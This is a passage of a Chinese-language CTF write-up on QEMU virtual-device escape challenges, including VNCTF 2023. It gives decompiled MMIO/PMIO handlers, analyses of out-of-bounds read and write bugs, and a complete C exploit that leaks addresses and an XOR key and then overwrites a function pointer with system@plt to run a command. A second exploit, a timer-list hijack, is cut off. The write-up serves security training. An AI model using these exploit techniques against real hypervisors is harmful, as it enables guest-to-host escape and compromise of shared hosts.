class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = addr &amp; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (addr &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;buf[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="denc-mmio-write"><a href="#denc-mmio-write" class="headerlink" title="denc_mmio_write"></a>denc_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">denc_mmio_write</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> val, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">unsigned</span> __int64)opaque;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (addr &amp; <span class="number">3</span>) == <span class="number">0</span> &amp;&amp; addr &lt;= <span class="number">0x24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = val ^ *(_DWORD *)&amp;opaque-&gt;key[addr];</span><br><span class="line">      opaque-&gt;buf[addr &gt;&gt; <span class="number">2</span>] = result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="denc-pmio-read"><a href="#denc-pmio-read" class="headerlink" title="denc_pmio_read"></a>denc_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">denc_pmio_read</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> || (addr &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;buf[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="denc-pmio-write"><a href="#denc-pmio-write" class="headerlink" title="denc_pmio_write"></a>denc_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">denc_pmio_write</span><span class="params">(DencState *opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> val, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (__int64)opaque;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = addr &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = val ^ *(_DWORD *)&amp;opaque-&gt;key[<span class="number">4</span> * addr];</span><br><span class="line">        opaque-&gt;buf[addr] = result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">0x660</span> )</span><br><span class="line">        <span class="keyword">return</span> opaque-&gt;fun(opaque-&gt;buf, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以看到，在<code>denc_mmio_read</code>函数中存在数组越界读，在<code>denc_mmio_write</code>函数中纯在数组越界写。在<code>denc_pmio_write</code>函数中调用了<code>fun</code>函数，而该<code>fun</code>是一个函数指针，我们可以通过输入越界读来泄露出地址，然后再利用数组越界写来将<code>fun</code>改为<code>system@plt</code>的地址，即可实现逃逸</p><h4 id="关键结构体"><a href="#关键结构体" class="headerlink" title="关键结构体"></a>关键结构体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 DencState struc ; (sizeof=0xB48, mappedto_112)</span><br><span class="line">00000000 field_0 db 2808 dup(?)</span><br><span class="line">00000AF8 key db 32 dup(?)</span><br><span class="line">00000B18 field_B18 db 8 dup(?)</span><br><span class="line">00000B20 buf dd 8 dup(?)</span><br><span class="line">00000B40 fun dq ?                                ; offset</span><br><span class="line">00000B48 DencState ends</span><br></pre></td></tr></table></figure><p>由于<code>denc_pmio_write</code>在写入数据时要将数据和<code>key</code>进行异或加密，但<code>key</code>可以让我们通过<code>denc_mmio_write</code>函数和<code>denc_mmio_read</code>相互配合来达到泄露<br>由于笔者的<code>C</code>语言学的像狗屎一样，所以这一道题在类型转换上面花了很多时间，而题目则是看了就瞬间有完整的攻击思路了</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* mmio_mem;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *) mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span> *) mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> pmio_mem = <span class="number">0x000000000000c000</span>;  </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> offset, <span class="type">uint32_t</span> value)</span> &#123;</span><br><span class="line">    outl(value, pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> inl(pmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[<span class="number">0x20</span>] = <span class="string">&quot;cat flag;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;iopl(3)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *pmio_fd = fopen(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!pmio_fd)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;pmio_fd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak the elf base...&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> leak = mmio_read(<span class="number">8</span>) + (((<span class="type">size_t</span>)mmio_read(<span class="number">9</span>)) &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    <span class="type">size_t</span> elf_base = leak - <span class="number">3841704</span>;</span><br><span class="line">    <span class="type">size_t</span> system = elf_base + <span class="number">0x2CCB60</span>;</span><br><span class="line">    hexx(<span class="string">&quot;elf_base&quot;</span>, elf_base);</span><br><span class="line">    hexx(<span class="string">&quot;system@plt&quot;</span>, system);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak the key...&quot;</span>);</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">        mmio_write(i, <span class="number">0</span>);</span><br><span class="line">        key[i] = mmio_read(i);</span><br><span class="line">    &#125;</span><br><span class="line">    binary_dump(<span class="string">&quot;key&quot;</span>, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change the buf to cat flag...&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, (*(<span class="type">uint32_t</span> *) &amp;cmd[<span class="number">0</span>]) ^ key[<span class="number">0</span>]);</span><br><span class="line">    mmio_write(<span class="number">1</span>, (*(<span class="type">uint32_t</span> *) &amp;cmd[<span class="number">4</span>]) ^ key[<span class="number">1</span>]);</span><br><span class="line">    mmio_write(<span class="number">2</span>, (*(<span class="type">uint32_t</span> *) &amp;cmd[<span class="number">8</span>]) ^ key[<span class="number">2</span>]);</span><br><span class="line">    info(<span class="string">&quot;change buf success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change the fun...&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>, (system &amp; <span class="number">0xFFFFFFFF</span>) ^ key[<span class="number">8</span>]);</span><br><span class="line">    mmio_write(<span class="number">9</span>, ((system &gt;&gt; <span class="number">32</span>)&amp;<span class="number">0xffffffff</span>) ^ key[<span class="number">9</span>]);</span><br><span class="line">    info(<span class="string">&quot;change the fun success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x660</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VNCTF-2023-escape-langlang-mountain2"><a href="#VNCTF-2023-escape-langlang-mountain2" class="headerlink" title="[VNCTF 2023] escape_langlang_mountain2"></a>[VNCTF 2023] escape_langlang_mountain2</h2><h3 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h3><h4 id="vn-mmio-read"><a href="#vn-mmio-read" class="headerlink" title="vn_mmio_read"></a>vn_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vn_mmio_read</span><span class="params">(__int64 a1, __int64 addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 opaque; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  opaque = object_dynamic_cast_assert(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">21LL</span>, <span class="string">&quot;vn_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(opaque + <span class="number">0xB80</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(*(<span class="type">int</span> *)(opaque + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL + opaque);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="vn-mmio-write"><a href="#vn-mmio-write" class="headerlink" title="vn_mmio_write"></a>vn_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vn_mmio_write</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> __int64 val)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 opaque; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  opaque = object_dynamic_cast_assert(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">42LL</span>, <span class="string">&quot;vn_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(opaque + <span class="number">0xB84</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(opaque + *(<span class="type">int</span> *)(opaque + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL) = val;<span class="comment">// 任意地址写</span></span><br><span class="line">      *(_DWORD *)(opaque + <span class="number">0xB84</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)val &lt;= <span class="number">0x3C</span> )</span><br><span class="line">        *(_DWORD *)(opaque + <span class="number">0xB80</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> &amp;&amp; HIDWORD(val) &lt;= <span class="number">0x3C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(opaque + HIDWORD(val) + <span class="number">0xB40</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在<code>vn_mmio_write</code>函数中，当<code>addr == 0x10</code>时存在数组溢出，从而能够让我们能够实现数组越界读。我们将<code>val</code>设置为为负数，读取<code>const MemoryRegionOps *ops</code>；来泄露出<code>qemu</code>地址，读取<code>void *opaque</code>;来泄露出堆地址。我们可以看到在<code>vn_mmio_write</code>函数中，当<code>addr ==0x30</code>时，我们有一次任意地址写的机会。于是我们的思路为，通过<code>main_loop_tlg</code>来泄露出<code>QEMUTimerList</code>的地址，然后修改<code>QEMUTimerList</code>中的<code>active_timers</code>指针指向我们我们伪造的<code>QEMTTimer</code>即可实现程序流的劫持</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 